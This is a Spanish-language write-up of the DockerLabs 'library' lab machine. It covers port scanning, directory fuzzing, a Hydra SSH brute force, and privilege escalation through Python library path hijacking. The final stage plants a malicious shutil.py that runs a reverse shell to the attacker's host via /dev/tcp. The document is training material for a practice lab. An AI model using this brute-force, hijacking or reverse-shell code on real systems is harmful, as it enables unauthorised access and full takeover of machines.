<p><img src="assets/logo-dockerlabs.png" alt="logodocker" w="200" h="200" /></p>

<p>En este reto de <a href="https://dockerlabs.es" title="dockerlabs">DockerLabs</a>  encontramos con escaneo de puertos para buscar una entrada al sistema  , fuzzing de directorios , library path hijacking python.</p>

<h2 id="herramientas-y-recursos-usados">Herramientas y recursos usados</h2>

<ul>
  <li>nmap</li>
  <li>Feroxbuster</li>
  <li>Hydra</li>
  <li>Python</li>
</ul>

<h2 id="enumeracion">Enumeracion</h2>

<p>Empezamos lanzando un nmap contra el objetivo .</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>nmap <span class="nt">-p-</span> <span class="nt">-sS</span> <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">--min-rate</span><span class="o">=</span>5000 <span class="nt">-n</span> <span class="nt">-vvv</span> 172.17.0.2 <span class="nt">-oX</span> library
</code></pre></div></div>
<p><a href="/reporte/librarynmap.html" title="reportesnmap">Reporte nmap</a></p>

<p>Nos dice que tenemos el 22 y el 80 primero revisamos la web a ver que encontramos es la de default y no hay nada , mientras revisamos codigo lanzamos feroxbuster.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>feroxbuster <span class="nt">-t</span> 400 <span class="nt">-e</span> <span class="nt">-x</span> php,txt,html,jpg,json,js <span class="nt">-s</span> 200 <span class="nt">-u</span> http://172.17.0.2
</code></pre></div></div>

<p><img src="assets/library/ferox.png" alt="ferox" /></p>

<p>Como podemos ver nos muestra un index php y un direcotorio js.
investigamos la web.</p>

<p><img src="assets/library/webpass.png" alt="web" /></p>

<p>En index php nos tira un dato y la unica logica que veo es que sea una password y en los directorios no tenemos permisos de escritura.</p>

<p>Solo se me ocurre usar hydra y rockyou dado que tambien teniamos el 22  abierto.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code> hydra <span class="nt">-L</span> ../../../rockyou.txt <span class="nt">-p</span> JIFGHDS87GYDFIGD ssh://172.17.0.2 <span class="nt">-t</span> 4
</code></pre></div></div>

<p><img src="assets/library/hydra.png" alt="hydra" /></p>

<h2 id="infiltracion">Infiltracion</h2>

<p>Con las credenciales ya podemos probar por ssh con los datos que nos dio hydra.</p>

<p><img src="assets/library/logincarlos.png" alt="carlos" /></p>

<p>Como siempre ni bien entramos comprobamos lo mas tipico , sudo , find ,script en directorios etc….
con sudo -l tenemos suerte</p>

<p><img src="assets/library/sudo.png" alt="sudo" /></p>

<p>Vamos a revisar que hace ese script.</p>

<p><img src="assets/library/script.png" alt="script" /></p>

<p>Como vemos llama a una libreia y esa es la parte que nos interesa.</p>

<h2 id="explotacion-y-escalada-final">Explotacion y escalada final.</h2>

<p>Ahora que sabemos lo que hace y usa el script y conocemos como funciona el path, lo unico que tendremos que hacer sera trasladornos a un directorio donde tengamos permisos de escritura.
Creamos un archivo con nombre  shutil.py , añadimos esa ruta al PATH y ejecutaremos el script con sudo.
El contenido del la libreria que creamos puede variar dependiendo del objetivo que queramos. 
Lo mas facil para mi seria mandarme una revshell o modificar los permisos de bash con chmod +x y luego ejecutando bash -p  esto es a gusto.</p>

<p>Primero creo mi libreria.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="n">os</span>

<span class="n">os</span><span class="p">.</span><span class="nf">system</span><span class="p">(</span><span class="sh">"</span><span class="s">bash -c </span><span class="sh">'</span><span class="s">bash -i &gt;&amp; /dev/tcp/192.168.0.112/443 0&gt;&amp;1</span><span class="sh">'"</span><span class="p">)</span>
</code></pre></div></div>

<p>Añadimos al PATH la ruta de la libreria nueva.</p>

<p><img src="assets/library/path.png" alt="path" /></p>

<p>Y por ultimo ejecutamos.</p>

<p><img src="assets/library/scriptexec.png" alt="exec" /></p>

<p><img src="assets/library/root.png" alt="root" /></p>

<p>Hasta aqui la maquina.</p>

<p>Saludos y muchas gracias por leer, pueden comentar dudas o si la han resuleto de otra forma debatamos cual metodo es mas eficaz.</p>

